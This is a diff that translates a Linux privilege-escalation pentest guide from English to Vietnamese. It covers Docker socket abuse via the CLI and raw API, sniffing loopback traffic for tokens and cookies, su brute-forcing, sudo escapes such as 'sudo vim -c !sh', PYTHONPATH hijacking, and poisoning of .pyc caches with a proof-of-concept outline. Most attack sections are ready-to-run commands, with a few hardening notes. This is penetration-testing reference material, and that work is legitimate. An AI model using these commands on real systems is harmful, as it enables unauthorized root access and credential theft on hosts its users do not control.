-Note that there may be some **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_). You can check this with:
+Lưu ý rằng có thể có một số **socket đang lắng nghe** các yêu cầu HTTP (_ý tôi không nói đến các tệp .socket mà là các tệp hoạt động như socket unix_). Bạn có thể kiểm tra bằng cách:
 
 ```bash
 curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
 ```
 
-If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.
+Nếu socket **phản hồi bằng một** yêu cầu HTTP, thì bạn có thể **giao tiếp** với nó và có thể **khai thác một lỗ hổng**.
 
 ### Writable Docker Socket
 
-The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.
+Docker socket, thường nằm tại `/var/run/docker.sock`, là một tệp quan trọng cần được bảo vệ. Theo mặc định, người dùng `root` và thành viên nhóm `docker` có quyền ghi vào tệp này. Quyền ghi vào socket này có thể dẫn đến leo thang đặc quyền. Dưới đây là giải thích cách thực hiện và các phương pháp thay thế nếu không có Docker CLI.
 
-#### **Privilege Escalation with Docker CLI**
+#### **Leo thang đặc quyền bằng Docker CLI**
 
-If you have write access to the Docker socket, you can escalate privileges using the following commands:<sup>[[15]](#references)</sup>
+Nếu bạn có quyền ghi vào Docker socket, bạn có thể leo thang đặc quyền bằng các lệnh sau:<sup>[[15]](#references)</sup>
 
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
 
-These commands allow you to run a container with root-level access to the host's file system.
+Các lệnh này cho phép bạn chạy container với quyền truy cập cấp root vào hệ thống tệp của host.
 
-#### **Using Docker API Directly**
+#### **Sử dụng trực tiếp Docker API**
 
-In cases where the Docker CLI isn't available, the Docker socket can still be abused using raw HTTP over the Unix socket. The most reliable flow is:
+Trong trường hợp không có Docker CLI, bạn vẫn có thể lạm dụng Docker socket bằng HTTP thô qua Unix socket. Quy trình đáng tin cậy nhất là:
 
-- create a long-lived helper container with the host root bind-mounted
-- start it
-- create an `exec` instance inside that helper
-- start the `exec` instance and read the output back through the API
+- tạo một container helper chạy lâu dài với thư mục gốc của host được bind-mount
+- khởi động nó
+- tạo một phiên bản `exec` bên trong container helper đó
+- khởi động phiên bản `exec` và đọc kết quả qua API
 
-**List Docker images**
+**Liệt kê các Docker image**
 
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
 
-**Create and start a helper container**
+**Tạo và khởi động một container hỗ trợ**
 
 ```bash
 HELPER=helper
@@ -874,7 +874,7 @@ curl --unix-socket /var/run/docker.sock \
   -X POST "http://localhost/v1.47/containers/${HELPER}/start"
 ```
 
-**Create an exec instance**
+**Tạo một instance exec**
 
 ```bash
 EXEC_ID=$(
@@ -887,7 +887,7 @@ EXEC_ID=$(
 )
 ```
 
-**Start the exec instance and read the output**
+**Khởi chạy instance exec và đọc đầu ra**
 
 ```bash
 curl --unix-socket /var/run/docker.sock \
@@ -896,31 +896,31 @@ curl --unix-socket /var/run/docker.sock \
   "http://localhost/v1.47/exec/${EXEC_ID}/start"
 ```
 
-This pattern is usually more robust than trying to drive `attach` manually with `socat` or `nc -U`. Once you can create a helper with `/:/host`, you can use additional `exec` instances to read files such as `/host/root/...`, add SSH keys under `/host/root/.ssh`, or modify host startup files.
+Mẫu này thường đáng tin cậy hơn so với việc cố gắng điều khiển `attach` thủ công bằng `socat` hoặc `nc -U`. Khi có thể tạo một helper với `/:/host`, bạn có thể dùng các phiên bản `exec` bổ sung để đọc những tệp như `/host/root/...`, thêm SSH key vào `/host/root/.ssh` hoặc chỉnh sửa các tệp khởi động của host.
 
-### Others
+### Khác
 
-Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Lưu ý rằng nếu bạn có quyền ghi vào docker socket vì **bạn đang thuộc group `docker`**, thì bạn có [**nhiều cách khác để leo thang đặc quyền**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Nếu [**docker API đang lắng nghe trên một port**, bạn cũng có thể xâm phạm nó](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
-Check **more ways to break out from containers or abuse container runtimes to escalate privileges** in:
+Xem **thêm các cách thoát khỏi container hoặc lạm dụng container runtime để leo thang đặc quyền** tại:
 
 
 {{#ref}}
 ../../containers-namespaces/container-security/
 {{#endref}}
 
-## Containerd (ctr) privilege escalation
+## Leo thang đặc quyền bằng Containerd (ctr)
 
-If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
+Nếu bạn thấy mình có thể sử dụng lệnh **`ctr`**, hãy đọc trang sau vì **bạn có thể lạm dụng nó để leo thang đặc quyền**:
 
 
 {{#ref}}
 ../../containers-namespaces/containerd-ctr-privilege-escalation.md
 {{#endref}}
 
-## **RunC** privilege escalation
+## Leo thang đặc quyền bằng **RunC**
 
-If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
+Nếu bạn thấy mình có thể sử dụng lệnh **`runc`**, hãy đọc trang sau vì **bạn có thể lạm dụng nó để leo thang đặc quyền**:
 
 
 {{#ref}}
@@ -929,15 +929,15 @@ If you find that you can use the **`runc`** command read the following page as *
 
 ## **D-Bus**
 
-D-Bus is a sophisticated **inter-Process Communication (IPC) system** that enables applications to efficiently interact and share data. Designed with the modern Linux system in mind, it offers a robust framework for different forms of application communication.<sup>[[16]](#references)</sup>
+D-Bus là một **hệ thống giao tiếp liên tiến trình (IPC)** tinh vi, cho phép các ứng dụng tương tác và chia sẻ dữ liệu hiệu quả. Được thiết kế dành cho các hệ thống Linux hiện đại, nó cung cấp một framework mạnh mẽ cho nhiều hình thức giao tiếp giữa các ứng dụng.<sup>[[16]](#references)</sup>
 
-The system is versatile, supporting basic IPC that enhances data exchange between processes, reminiscent of **enhanced UNIX domain sockets**. Moreover, it aids in broadcasting events or signals, fostering seamless integration among system components. For instance, a signal from a Bluetooth daemon about an incoming call can prompt a music player to mute, enhancing user experience. Additionally, D-Bus supports a remote object system, simplifying service requests and method invocations between applications, streamlining processes that were traditionally complex.
+Hệ thống này rất linh hoạt, hỗ trợ IPC cơ bản giúp tăng cường trao đổi dữ liệu giữa các tiến trình, tương tự như **UNIX domain socket được cải tiến**. Ngoài ra, nó còn hỗ trợ phát sự kiện hoặc tín hiệu, thúc đẩy sự tích hợp liền mạch giữa các thành phần hệ thống. Ví dụ: tín hiệu từ một daemon Bluetooth báo có cuộc gọi đến có thể khiến trình phát nhạc tắt tiếng, cải thiện trải nghiệm người dùng. D-Bus cũng hỗ trợ hệ thống đối tượng từ xa, giúp đơn giản hóa các yêu cầu dịch vụ và lời gọi phương thức giữa các ứng dụng, tinh giản những quy trình vốn phức tạp.
 
-D-Bus operates on an **allow/deny model**, managing message permissions (method calls, signal emissions, etc.) based on the cumulative effect of matching policy rules. These policies specify interactions with the bus, potentially allowing for privilege escalation through the exploitation of these permissions.
+D-Bus hoạt động theo **mô hình cho phép/từ chối**, quản lý quyền đối với thông điệp (lời gọi phương thức, phát tín hiệu, v.v.) dựa trên tác động tổng hợp của các quy tắc chính sách khớp. Những chính sách này quy định các tương tác với bus và có thể tạo điều kiện leo thang đặc quyền thông qua việc khai thác các quyền đó.
 
-An example of such a policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` is provided, detailing permissions for the root user to own, send to, and receive messages from `fi.w1.wpa_supplicant1`.
+Ví dụ về một chính sách như vậy trong `/etc/dbus-1/system.d/wpa_supplicant.conf` được cung cấp bên dưới, mô tả quyền của người dùng root trong việc sở hữu, gửi thông điệp đến và nhận thông điệp từ `fi.w1.wpa_supplicant1`.
 
-Policies without a specified user or group apply universally, while "default" context policies apply to all not covered by other specific policies.
+Các chính sách không chỉ định người dùng hoặc group sẽ áp dụng cho tất cả mọi người, trong khi các chính sách trong ngữ cảnh "default" áp dụng cho mọi trường hợp không được bao phủ bởi các chính sách cụ thể khác.
 
 ```xml
 <policy user="root">
@@ -948,18 +948,18 @@ Policies without a specified user or group apply universally, while "default" co
 </policy>
 ```
 
-**Learn how to enumerate and exploit a D-Bus communication here:**
+**Tìm hiểu cách enumerate và exploit giao tiếp D-Bus tại đây:**
 
 
 {{#ref}}
 ../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
 {{#endref}}
 
-## **Network**
+## **Mạng**
 
-It's always interesting to enumerate the network and figure out the position of the machine.
+Luôn hữu ích khi enumerate mạng và xác định vị trí của máy.
 
-### Generic enumeration
+### Enumerate tổng quát
 
 ```bash
 #Hostname, hosts and DNS
@@ -1018,11 +1018,11 @@ sudo conntrack -L 2>/dev/null | head -n 20
 lsof -i
 ```
 
-If an active `/etc/inetd.conf` entry runs GNU Inetutils `telnetd` as root, check the configured binary version and the local listener even when the port is bound only to loopback. GNU Inetutils 1.9.3 through 2.7 had a [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) in which client-supplied `USER` reached `login -f` (CVE-2026-24061). A process or version string is an indicator; confirm vendor patch status and the actual daemon before treating it as exposed. The [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) has more detail.
+Nếu một mục đang hoạt động trong `/etc/inetd.conf` chạy GNU Inetutils `telnetd` với quyền root, hãy kiểm tra phiên bản binary được cấu hình và listener cục bộ, kể cả khi cổng chỉ bind vào loopback. GNU Inetutils từ phiên bản 1.9.3 đến 2.7 có [lỗ hổng bypass xác thực Telnet](https://seclists.org/oss-sec/2026/q1/89), trong đó `USER` do client cung cấp được chuyển tới `login -f` (CVE-2026-24061). Tiến trình hoặc chuỗi phiên bản chỉ là dấu hiệu; hãy xác nhận trạng thái bản vá của nhà cung cấp và daemon thực tế trước khi kết luận hệ thống bị lộ. [Hướng dẫn Telnet](../../../network-services-pentesting/pentesting-telnet.md) có thêm chi tiết.
 
-### Outbound filtering quick triage
+### Phân loại nhanh bộ lọc outbound
 
-If the host can run commands but callbacks fail, separate DNS, transport, proxy, and route filtering quickly:
+Nếu host chạy được lệnh nhưng callback thất bại, hãy nhanh chóng phân biệt việc lọc DNS, transport, proxy và route:
 
 ```bash
 # DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
@@ -1040,9 +1040,9 @@ env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
 curl --socks5-hostname <ip>:1080 https://ifconfig.me
 ```
 
-### Open ports
+### Các cổng đang mở
 
-Always check network services running on the machine that you weren't able to interact with before accessing it:
+Luôn kiểm tra các dịch vụ mạng đang chạy trên máy mà bạn chưa thể tương tác trước khi truy cập máy đó:
 
 ```bash
 (netstat -punta || ss --ntpu)
@@ -1052,15 +1052,15 @@ ss -tulpn
 ss -tulpn | awk '{print $5}' | sort -u
 ```
 
-Classify listeners by bind target:
+Phân loại các listener theo địa chỉ bind:
 
-- `0.0.0.0` / `[::]`: exposed on all local interfaces.
-- `127.0.0.1` / `::1`: local-only (good tunnel/forward candidates).
-- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usually reachable only from internal segments.
+- `0.0.0.0` / `[::]`: lắng nghe trên mọi interface cục bộ.
+- `127.0.0.1` / `::1`: chỉ cục bộ (các ứng viên phù hợp để tunnel/forward).
+- Các IP nội bộ cụ thể (ví dụ: `10.x`, `172.16/12`, `192.168.x`, `fe80::`): thường chỉ có thể truy cập từ các phân đoạn mạng nội bộ.
 
-### Local-only service triage workflow
+### Quy trình kiểm tra nhanh service chỉ cục bộ
 
-When you compromise a host, services bound to `127.0.0.1` often become reachable for the first time from your shell. A quick local workflow is:
+Khi chiếm được một host, các service bind với `127.0.0.1` thường lần đầu tiên có thể truy cập được từ shell của bạn. Quy trình cục bộ nhanh như sau:
 
 ```bash
 # 1) Find local listeners
@@ -1077,9 +1077,9 @@ nc 127.0.0.1 <port>
 printf 'HELP\r\n' | nc 127.0.0.1 <port>
 ```
 
-### LinPEAS as a network scanner (network-only mode)
+### LinPEAS như một trình quét mạng (chế độ chỉ quét mạng)
 
-Besides local PE checks, linPEAS can run as a focused network scanner. It uses available binaries in `$PATH` (typically `fping`, `ping`, `nc`, `ncat`) and does not install tooling.
+Ngoài các bước kiểm tra PE cục bộ, linPEAS có thể chạy như một trình quét mạng chuyên dụng. Nó sử dụng các binary có sẵn trong `$PATH` (thường là `fping`, `ping`, `nc`, `ncat`) và không cài đặt công cụ.
 
 ```bash
 # Auto-discover subnets + hosts + quick ports
@@ -1098,17 +1098,17 @@ Besides local PE checks, linPEAS can run as a focused network scanner. It uses a
 ./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
 ```
 
-If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS behaves as a pure network scanner (skipping the rest of privilege-escalation checks).
+Nếu bạn dùng `-d`, `-p` hoặc `-i` mà không có `-t`, linPEAS sẽ hoạt động như một trình quét mạng thuần túy (bỏ qua các bước kiểm tra leo thang đặc quyền còn lại).
 
-### Sniffing
+### Nghe lén
 
-Check if you can sniff traffic. If you can, you could be able to grab some credentials.
+Kiểm tra xem bạn có thể nghe lén lưu lượng mạng hay không. Nếu có, bạn có thể lấy được một số thông tin đăng nhập.
 
 ```
 timeout 1 tcpdump
 ```
 
-Quick practical checks:
+Các bước kiểm tra thực tế nhanh:
 
 ```bash
 #Can I capture without full sudo?
@@ -1119,14 +1119,14 @@ tcpdump -D
 ip -br addr
 ```
 
-Loopback (`lo`) is especially valuable in post-exploitation because many internal-only services expose tokens/cookies/credentials there:
+Loopback (`lo`) đặc biệt có giá trị trong post-exploitation vì nhiều dịch vụ chỉ dành cho nội bộ làm lộ tokens/cookies/credentials tại đó:
 
 ```bash
 sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
   | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
 ```
 
-Capture now, parse later:
+Thu thập ngay, phân tích cú pháp sau:
 
 ```bash
 sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
@@ -1134,11 +1134,11 @@ tshark -r /tmp/capture.pcap -Y http.request \
   -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
 ```
 
-## Users
+## Người dùng
 
-### Generic Enumeration
+### Liệt kê chung
 
-Check **who** you are, which **privileges** do you have, which **users** are in the systems, which ones can **login** and which ones have **root privileges:**
+Kiểm tra bạn là **ai**, bạn có những **quyền hạn** nào, hệ thống có những **người dùng** nào, những ai có thể **login** và những ai có **quyền root:**
 
 ```bash
 #Info about me
@@ -1165,14 +1165,14 @@ for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | so
 gpg --list-keys 2>/dev/null
 ```
 
-### Big UID
+### UID lớn
 
-Some Linux versions were affected by a bug that allows users with **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
-**Exploit it** using: **`systemd-run -t /bin/bash`**
+Một số phiên bản Linux bị ảnh hưởng bởi lỗi cho phép người dùng có **UID > INT_MAX** leo thang đặc quyền. Tìm hiểu thêm: [tại đây](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tại đây](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) và [tại đây](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
+**Khai thác lỗi này** bằng: **`systemd-run -t /bin/bash`**
 
-### Groups
+### Nhóm
 
-Check if you are a **member of some group** that could grant you root privileges:
+Kiểm tra xem bạn có phải là **thành viên của nhóm nào** có thể cấp cho bạn quyền root hay không:
 
 
 {{#ref}}
@@ -1181,7 +1181,7 @@ Check if you are a **member of some group** that could grant you root privileges
 
 ### Clipboard
 
-Check if anything interesting is located inside the clipboard (if possible)
+Kiểm tra xem clipboard có chứa thông tin nào đáng chú ý không (nếu có thể)
 
 ```bash
 if [ `which xclip 2>/dev/null` ]; then
@@ -1194,37 +1194,37 @@ if [ `which xclip 2>/dev/null` ]; then
   fi
 ```
 
-### Password Policy
+### Chính sách mật khẩu
 
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
 
-### Known passwords
+### Mật khẩu đã biết
 
-If you **know any password** of the environment **try to login as each user** using the password.
+Nếu bạn **biết bất kỳ mật khẩu nào** trong môi trường, **hãy thử đăng nhập bằng mật khẩu đó với từng người dùng**.
 
 ### Su Brute
 
-If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
-[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.
+Nếu bạn không ngại gây nhiều tiếng ồn và máy tính có các binary `su` và `timeout`, bạn có thể thử brute-force người dùng bằng [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) với tham số `-a` cũng thử brute-force người dùng.
 
-## Writable PATH abuses
+## Lạm dụng PATH có quyền ghi
 
 ### $PATH
 
-If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user (root ideally) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.
+Nếu bạn phát hiện mình có thể **ghi vào một thư mục nào đó trong $PATH**, bạn có thể leo thang đặc quyền bằng cách **tạo backdoor trong thư mục có quyền ghi** với tên của một lệnh sẽ được người dùng khác (lý tưởng nhất là root) thực thi, đồng thời lệnh đó **không được tải từ thư mục nào nằm trước thư mục có quyền ghi trong $PATH**.
 
-### SUDO and SUID
+### SUDO và SUID
 
-You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
+Bạn có thể được phép thực thi một số lệnh bằng sudo, hoặc chúng có thể có bit suid. Kiểm tra bằng:
 
 ```bash
 sudo -l #Check commands you can execute with sudo
 find / -perm -4000 2>/dev/null #Find all SUID binaries
 ```
 
-Some **unexpected commands allow you to read and/or write files or even execute a command**.<sup>[[8]](#references)</sup> For example:
+Một số **lệnh không ngờ tới cho phép bạn đọc và/hoặc ghi tệp, thậm chí thực thi lệnh**.<sup>[[8]](#references)</sup> Ví dụ:
 
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
@@ -1237,7 +1237,7 @@ less>! <shell_comand>
 
 ### NOPASSWD
 
-Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
+Cấu hình Sudo có thể cho phép người dùng thực thi một số lệnh với quyền của người dùng khác mà không cần biết mật khẩu.
 
 ```
 $ sudo -l
@@ -1245,23 +1245,23 @@ User demo may run the following commands on crashlab:
     (root) NOPASSWD: /usr/bin/vim
 ```
 
-In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.
+Trong ví dụ này, người dùng demo có thể chạy vim với quyền root; giờ đây rất dễ lấy được shell bằng cách thêm SSH key vào thư mục root hoặc gọi sh.
 
 ```
 sudo vim -c '!sh'
 ```
 
-### Unquoted Bash comparison in a sudo script
+### So sánh Bash không đặt trong dấu ngoặc kép trong script sudo
 
-In Bash, the right side of `[[ "$protected" == $candidate ]]` is a pattern. If a root-capable sudo script fills `candidate` from a caller-controlled file, a value such as `prefix*` can match the start of a protected string. Different success and error paths may then expose a prefix oracle. Quote the right side (`[[ "$protected" == "$candidate" ]]`) when literal equality is intended. Review the actual sudo arguments, input provenance, and observable branch behavior before treating an unquoted comparison as exploitable. The [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) defines this pattern behavior.
+Trong Bash, vế phải của `[[ "$protected" == $candidate ]]` là một pattern. Nếu một script sudo có khả năng chạy với quyền root gán `candidate` từ một tệp do người gọi kiểm soát, một giá trị như `prefix*` có thể khớp với phần đầu của chuỗi được bảo vệ. Các nhánh xử lý thành công và lỗi khác nhau sau đó có thể làm lộ một prefix oracle. Hãy đặt vế phải trong dấu ngoặc kép (`[[ "$protected" == "$candidate" ]]`) khi muốn so sánh chính xác. Hãy kiểm tra các đối số sudo thực tế, nguồn gốc đầu vào và hành vi có thể quan sát của các nhánh trước khi kết luận rằng phép so sánh không đặt trong dấu ngoặc kép có thể bị khai thác. [Tài liệu hướng dẫn GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) mô tả hành vi của pattern này.
 
-### PrusaSlicer project files under sudo
+### Tệp dự án PrusaSlicer khi chạy bằng sudo
 
-An unrestricted root-capable sudo grant for `prusaslicer` or `prusa-slicer` deserves review if the caller can choose the `.3mf` project being sliced. A project can carry a post-processing script that runs when G-code is exported; crafted projects could execute commands in PrusaSlicer through 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Confirm the effective sudo rule, binary version and vendor patches, project source, and whether the relevant export path runs before concluding that the privilege boundary is reachable. A fixed project argument or effective `NOEXEC` policy can change the outcome. Merely finding the slicer installed does not establish a privilege escalation path.
+Cần xem xét kỹ một quyền sudo không hạn chế cho `prusaslicer` hoặc `prusa-slicer` có khả năng chạy với quyền root nếu người gọi có thể chọn dự án `.3mf` để cắt lớp. Một dự án có thể chứa script hậu xử lý chạy khi xuất G-code; các dự án được tạo có chủ đích có thể thực thi lệnh trong PrusaSlicer đến phiên bản 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Trước khi kết luận rằng có thể vượt qua ranh giới đặc quyền, hãy xác nhận quy tắc sudo có hiệu lực, phiên bản binary và các bản vá từ nhà cung cấp, nguồn dự án và liệu đường dẫn xuất liên quan có được thực thi hay không. Đối số dự án cố định hoặc chính sách `NOEXEC` có hiệu lực có thể làm thay đổi kết quả. Chỉ phát hiện slicer đã được cài đặt không đủ để xác định có đường dẫn nâng quyền hay không.
 
 ### SETENV
 
-This directive allows the user to **set an environment variable** while executing something:
+Chỉ thị này cho phép người dùng **đặt một biến môi trường** khi thực thi một lệnh:
 
 ```bash
 $ sudo -l
@@ -1269,26 +1269,26 @@ User waldo may run the following commands on admirer:
     (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
 
-This example, **based on HTB machine Admirer**, was **vulnerable** to **PYTHONPATH hijacking** to load an arbitrary python library while executing the script as root:
+Ví dụ này, **dựa trên máy HTB Admirer**, **dễ bị** **PYTHONPATH hijacking** để tải một thư viện Python tùy ý khi thực thi script với quyền root:
 
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
 
-### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports
+### Đầu độc `__pycache__` / `.pyc` có quyền ghi trong các module Python được phép chạy bằng sudo
 
-If a **sudo-allowed Python script** imports a module whose package directory contains a **writable `__pycache__`**, you may be able to replace the cached `.pyc` and get code execution as the privileged user on the next import.<sup>[[30]](#references)</sup>
+Nếu một **script Python được phép chạy bằng sudo** import một module có thư mục package chứa `__pycache__` **có quyền ghi**, bạn có thể thay thế `.pyc` đã cache và thực thi mã với quyền của người dùng đặc quyền ở lần import tiếp theo.<sup>[[30]](#references)</sup>
 
-- Why it works:
-  - CPython stores bytecode caches in `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
-  - The interpreter validates the **header** (magic + timestamp/hash metadata tied to the source), then executes the marshaled code object stored after that header.
-  - If you can **delete and recreate** the cached file because the directory is writable, a root-owned but non-writable `.pyc` can still be replaced.
-- Typical path:
-  - `sudo -l` shows a Python script or wrapper you can run as root.
-  - That script imports a local module from `/opt/app/`, `/usr/local/lib/...`, etc.
-  - The imported module's `__pycache__` directory is writable by your user or by everyone.
+- Vì sao cách này hiệu quả:
+  - CPython lưu bytecode cache trong `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
+  - Trình thông dịch xác thực **header** (magic + metadata timestamp/hash gắn với source), sau đó thực thi code object đã marshal nằm sau header đó.
+  - Nếu bạn có thể **xóa rồi tạo lại** file cache vì thư mục có quyền ghi, bạn vẫn có thể thay thế một file `.pyc` thuộc sở hữu của root nhưng không có quyền ghi.
+- Đường dẫn thường gặp:
+  - `sudo -l` cho thấy một script hoặc wrapper Python mà bạn có thể chạy với quyền root.
+  - Script đó import một module cục bộ từ `/opt/app/`, `/usr/local/lib/...`, v.v.
+  - Thư mục `__pycache__` của module được import có quyền ghi bởi user của bạn hoặc mọi người.
 
-Quick enumeration:
+Liệt kê nhanh:
 
 ```bash
 sudo -l
@@ -1296,7 +1296,7 @@ find / -type d -name __pycache__ -writable 2>/dev/null
 find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
 ```
 
-If you can inspect the privileged script, identify imported modules and their cache path:<sup>[[32]](#references)</sup>
+Nếu bạn có thể kiểm tra script có đặc quyền, hãy xác định các module được import và đường dẫn cache của chúng:<sup>[[32]](#references)</sup>
 
 ```bash
 grep -R "^import \\|^from " /opt/target/ 2>/dev/null
@@ -1308,20 +1308,20 @@ print(spec.cached)
 PY
 ```
 
-Abuse workflow:
+Quy trình khai thác:
 
-1. Run the sudo-allowed script once so Python creates the legit cache file if it does not already exist.
-2. Read the first 16 bytes from the legit `.pyc` and reuse them in the poisoned file.
-3. Compile a payload code object, `marshal.dumps(...)` it, delete the original cache file, and recreate it with the original header plus your malicious bytecode.
-4. Re-run the sudo-allowed script so the import executes your payload as root.
+1. Chạy script được phép dùng sudo một lần để Python tạo file cache hợp lệ nếu file đó chưa tồn tại.
+2. Đọc 16 byte đầu tiên từ file `.pyc` hợp lệ và dùng lại chúng trong file bị đầu độc.
+3. Biên dịch một code object chứa payload, dùng `marshal.dumps(...)` để tuần tự hóa nó, xóa file cache gốc rồi tạo lại file với header gốc cùng bytecode độc hại của bạn.
+4. Chạy lại script được phép dùng sudo để lệnh import thực thi payload của bạn với quyền root.
 
-Important notes:
+Lưu ý quan trọng:
 
-- Reusing the original header is key because Python checks the cache metadata against the source file, not whether the bytecode body really matches the source.
-- This is especially useful when the source file is root-owned and not writable, but the containing `__pycache__` directory is.
-- `PYTHONDONTWRITEBYTECODE=1` and `python -B` stop Python from writing new `.pyc` files; they do **not** stop it from loading an already valid, attacker-replaced cache. The critical boundary is whether a lower-privileged user can replace a cache that the privileged import will accept. Python checks timestamp/size or hash metadata before loading cached bytecode. See the [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) and [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).
+- Dùng lại header gốc là yếu tố then chốt vì Python kiểm tra metadata của cache đối chiếu với file nguồn, chứ không kiểm tra xem phần thân bytecode có thực sự khớp với file nguồn hay không.
+- Cách này đặc biệt hữu ích khi file nguồn thuộc sở hữu của root và không thể ghi, nhưng thư mục `__pycache__` chứa file đó thì có thể ghi.
+- `PYTHONDONTWRITEBYTECODE=1` và `python -B` ngăn Python ghi file `.pyc` mới; chúng **không** ngăn Python tải một cache hợp lệ sẵn có đã bị kẻ tấn công thay thế. Ranh giới bảo mật then chốt là liệu người dùng có đặc quyền thấp hơn có thể thay thế cache mà lệnh import có đặc quyền chấp nhận hay không. Python kiểm tra metadata thời gian/kích thước hoặc hash trước khi tải bytecode đã cache. Xem [tài liệu tham khảo về import của Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) và [tài liệu về dòng lệnh](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).
 
-Minimal proof-of-concept shape:
+Dạng proof-of-concept tối giản:
 
 ```python
 import marshal, pathlib, subprocess, tempfile
@@ -1342,19 +1342,19 @@ subprocess.run(["sudo", "/opt/app/runner.py"])
 
 Hardening:
 
-- Ensure no directory in the privileged Python import path is writable by low-privileged users, including `__pycache__`.
-- Audit cache-directory ownership and permissions, including existing `.pyc` files. Disabling bytecode writes can reduce new cache creation, but does not neutralize a replaceable existing cache.
-- Treat writable local Python modules and writable cache directories the same way you would treat writable shell scripts or shared libraries executed by root.
+- Đảm bảo không có thư mục nào trong đường dẫn import Python có đặc quyền cho phép người dùng ít đặc quyền ghi, bao gồm cả `__pycache__`.
+- Kiểm tra chủ sở hữu và quyền của thư mục cache, bao gồm cả các tệp `.pyc` hiện có. Tắt ghi bytecode có thể giảm việc tạo cache mới, nhưng không vô hiệu hóa cache hiện có có thể bị thay thế.
+- Xử lý các module Python cục bộ có thể ghi và thư mục cache có thể ghi tương tự như cách bạn xử lý các shell script hoặc thư viện dùng chung có thể ghi được thực thi bởi root.
 
-### BASH_ENV preserved via sudo env_keep → root shell
+### BASH_ENV được giữ lại qua sudo env_keep → shell root
 
-If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.<sup>[[24]](#references)</sup>
+Nếu sudoers giữ lại `BASH_ENV` (ví dụ: `Defaults env_keep+="ENV BASH_ENV"`), bạn có thể tận dụng hành vi khởi động của Bash không tương tác để chạy mã tùy ý với quyền root khi gọi một lệnh được cho phép.<sup>[[24]](#references)</sup>
 
